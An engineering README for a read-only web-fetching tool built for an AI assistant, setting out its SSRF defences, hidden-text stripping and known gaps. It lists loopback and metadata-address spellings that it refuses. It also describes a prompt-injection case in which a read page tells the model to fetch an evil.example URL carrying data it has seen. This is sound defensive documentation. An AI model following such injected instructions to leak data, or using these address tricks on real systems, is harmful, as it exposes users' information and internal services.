# web-ai — engineering rules

**Reads the web; never writes to it.** web-ai fetches a page and hands back what the page says, fetches a link's
headers, and asks GitHub's public API what a stranger sees. No model, no summary, no login, no cookie, nothing
sent but an address. Every tool on its door is `readOnlyHint`, so the assistant's gate never stops one, and every
tool is also `openWorldHint`, because each reaches the internet.

It exists for the job-application workflow (`../plan.md`, "Job application workflow"): given an employer's address,
find the posting and hand its text to `apply-ai`; and for the one thing `apply-ai` cannot see, because it has no
network on purpose: a CV line saying repositories were private passed every check while most of them were public.

**The risk is the point of the tool.** A model chooses the URL, and a page it read can suggest one. Left alone,
"fetch this page" is "ask this machine's network for anything". Almost every rule below is about that.

## What it does, and what it cannot

- **`read_page(url)`** returns `url, final_url, status, title, text, links, content_type, size, truncated, method,
  time, warnings, next` (and `redirects`). `text` is the page as a reader sees it, one line per block; `links` are
  absolute `http`, `https` and `mailto` addresses with their link text (the careers-page step needs them, and text
  alone loses them). It refuses a PDF or any non-text file, with "ask the user to paste the text instead".
  `method` is always `http`: there is no browser (below).
- **`check_link(url)`** is a HEAD request: status, where it ends after redirects, content type. A site that refuses
  HEAD (405, 501) is reported as that, not as a broken link.
- **`github_visibility(url)`** asks `api.github.com` with no login. A repository answers 200 (public) or 404, and a
  private repository answers a stranger exactly as one that does not exist, so **the result says it cannot tell
  which**. An account lists its public repositories (the 100 most recently pushed; `may_be_more` says when that
  may not be all). Only the facts asked about are returned, never a repository's own description. GitHub
  limits requests that carry no login (documented as 60 an hour per address; not reached in these runs); a refusal
  is an error, never an answer.

## The rules, and the thing that went wrong behind each

- **The check is on the resolved address, and the connection goes to that address.** `safety.py` resolves the host,
  requires *every* address it resolves to to be public (`is_public`), and `fetch.py` then connects to that address
  by putting it in the URL, keeping the real name for `Host`, for TLS's server name and for certificate checking.
  The name is never resolved a second time, so a hostile DNS cannot answer differently the second time
  (rebinding). A check on how the URL is *written* would need a list of every spelling; `2130706433`, `0x7f.1`,
  `127.1` and `localhost` all resolve to loopback and are refused with no such list (tested against the real
  resolver). Refused: private, loopback, link-local (including the cloud metadata address 169.254.169.254),
  carrier-grade (100.64/10), unspecified, reserved, documentation, multicast, an IPv4 address inside an IPv6 one,
  and NAT64, 6to4 and Teredo, which are routed to an IPv4 address by a gateway.
- **A certificate is checked against the name, not the address.** Putting the address in the URL would otherwise
  check the certificate against that. The `sni_hostname` extension carries the name. Tested with a real TLS server:
  a trusted certificate for *another* name fails. Breaking either the extension or `verify` fails that test.
- **Redirects are followed by hand and every hop starts from the beginning.** A public page that redirects to
  `http://169.254.169.254/` is refused at that hop; so is a redirect to `file:` or another scheme. At most five.
- **No cookie can pass from one request to the next, no proxy is used.** A new client for every hop; a shared one
  was shown to send the cookie it was given. `trust_env=False` ignores `HTTP_PROXY` and `.netrc`: a proxy resolves
  names itself and would walk around the address check.
- **Limits.** 5 MB, counted *after* decompression (80 MB of gzip became a 1 MB read in the test: a few kilobytes
  must not become a gigabyte); 30 s for an answer (10 s to connect, so a black-holed address falls through to the
  next one); 60 s in all; the address itself at most 2048 characters. A page is cut at 120,000 characters of text
  for the model's sake and flagged (`truncated`).
- **Text a reader cannot see is not returned.** The cheapest way for a page to speak to a model is text no person
  sees: a hidden element, a zero-width or Unicode "tag" run, a script. `text.py` drops `script`, `style`,
  `noscript`, `template`, `svg`, anything `hidden`, `aria-hidden="true"` or with an inline `display:none` or
  `visibility:hidden`, and every format character (zero-width, bidirectional overrides, the tag block). **It cannot
  catch text hidden by a stylesheet** (white on white, positioned off screen): that needs a browser's layout.
  `read_page`'s description and its `next` field both say the text is untrusted.
- **A failed fetch is raised, and the door must translate it.** `FetchError` is raised, not returned as data:
  `apply-ai` returns its refusals as data and the audit log records those as `ok`, which a refused address must not
  be. But the MCP SDK treats any exception except its own `ToolError` as a crash and keeps the reason on the
  server: the model was told only "Error executing tool read_page", without "paste the text instead". Found by
  testing through a client session, not by calling the server directly (which raises, so `is_error` is never
  seen). `mcp_server._answered` translates. Checked through the assistant's own `execute()` over real stdio: a
  refused address is audited `failed` with the reason, a good fetch `ok`.
- **A source newline is whitespace.** The first extractor kept it as a line break, so a hard-wrapped paragraph
  came out in pieces ("Email us" and "Top" on separate lines for no reason). Found by reading the extracted text of
  a test page, not by a test that existed. Inside `<pre>` it stays a break.
- **A page that looks empty may not be.** A page with almost no text and a script may build itself in a browser,
  and the result says so, with the counts, and "may". The first rule (under 300 characters and any script) warned
  about example.com, which is one sentence and one script and is a whole page, found by reading the real page. Now:
  under 100 characters and any script, or under 300 and three scripts. A heuristic, honestly worded.
- **"Could not connect" must say why.** On the real network from this machine, IPv4 connections to example.com's
  addresses timed out about half the time (4 of 8 for each) and IPv6 never connected (2026-10-28; the model download in
  an image build timed out on GitHub the same day, cause not established). When all four addresses failed, the tool said only "Could not
  connect". Now: "it has 4 addresses and 2 timed out, 2 failed. If the network is only unreliable, trying again
  may work."
- **Quiet the HTTP client's own log.** httpx logs each request at INFO with the *address* it was sent to (not the
  site's name) and the whole query string, into the container's log. `main()` sets it to WARNING.
- **A GitHub name is checked before anything is asked.** `octo/..` matched the allowed characters. `.` and `..`
  are refused outright.

## What this does not stop

Say these plainly to anyone deciding how far to trust it.

- **A GET can carry data out in its address**, and a read-only tool is never held at the gate. A page the model
  read could tell it to fetch `https://evil.example/?q=<something it has seen>`. The 2048-character limit bounds
  what one call carries, and nothing is sent but the address; neither stops it. The tool is annotated read-only
  because `plan.md` says it is, and the gate follows `readOnlyHint`; annotating it as a write would make the
  assistant ask about every fetch. **Decided 2026-10-29, by the user: leave them ungated.** (Reasoned, not
  demonstrated: no model was asked to do this.)
- **A page can still say whatever it likes to the model.** Dropping hidden text removes the cheapest way, not
  the visible ones. The text is returned as data and described as untrusted; nothing here can make a model ignore
  it.
- **No browser.** A page that builds itself in script comes back nearly empty and says so (`warnings`). The plan's
  headless-browser fallback is not built: it would add a browser to the image (hundreds of MB) and its own
  surface (it runs a page's scripts, whose own requests the address checks here do not cover, so it would need every
  request checked, or its own isolated container). Recommended not yet (2026-10-29); build it as its own container
  if a second real posting needs it.
- **No PDFs.** A posting that is a PDF is pasted as text.
- **Hosts are not allow-listed.** Any public site may be read.

## Not built, on purpose

- **No model.** A summary is a model's words about the page, and nothing here puts a model's words where the
  page's were.
- **No browser, no login, no cookies, no POST.** Reading, not using.
- **No crawling.** One address in, one page out; following the links is the assistant's choice, call by call.
- **No port allow-list.** An odd port on a public address is not a way in.

## Layout

    webai/
      safety.py       which addresses and URLs may be fetched (the part that must never be wrong)
      fetch.py        one safe GET or HEAD: vetted address, redirects by hand, no cookies, size and time limits
      text.py         HTML to the text a reader sees and its links; decoding; invisible characters
      operations.py   read_page, check_link, github_visibility, as data
      mcp_server.py   the MCP door (FetchError -> ToolError); cli.py  ./web, the human door
    tests/
      fakesite.py     a web server on this machine's loopback that records exactly what it was sent
      test_safety.py  address and URL rules          test_text.py  HTML to text
      test_fetch.py   what goes on the wire, what is refused, limits, TLS naming
      test_operations.py  the three operations      test_mcp_door.py  through a client session

## Commands

    ./web read URL [--links]       ./web check URL       ./web github URL
    cd web-ai && ../.venv/bin/python -m pytest tests -q

The tests start servers on this machine's loopback (including 127.0.0.2 and so on, which Linux provides) and reach
nothing else. `test_https_checks_the_certificate_against_the_name_not_the_address` needs the `openssl` command and
skips without it.

## Verified for real (2026-10-28)

- **Refused, with the real resolver:** 169.254.169.254, `localhost`, 127.0.0.1, `[::1]`, `2130706433`, `file:///`,
  an address with a password, 10.0.0.1. In a container on a compose-style network, a service name that resolves
  to 172.20.0.2 was refused while a plain TCP connection to it succeeded: the refusal is the tool's.
- **Read for real:** example.com over TLS; an 89 KB Hugging Face page (title, text, 47 links); a PDF refused with the
  right advice; a 401 reported as sent; GitHub's API for `octocat/Hello-World` (public), a repository that does not
  exist (not visible, "private or does not exist"), and the account `octocat` (8 public repositories).
- **Through the assistant:** launched over stdio from a tools.yaml entry and called through `execute()`: read-only,
  refused audited as `failed` with the reason, a good fetch `ok`.
- **Not run:** a page that is a real job posting; the web app's pages for this tool (none exist); a headless
  browser (not built).
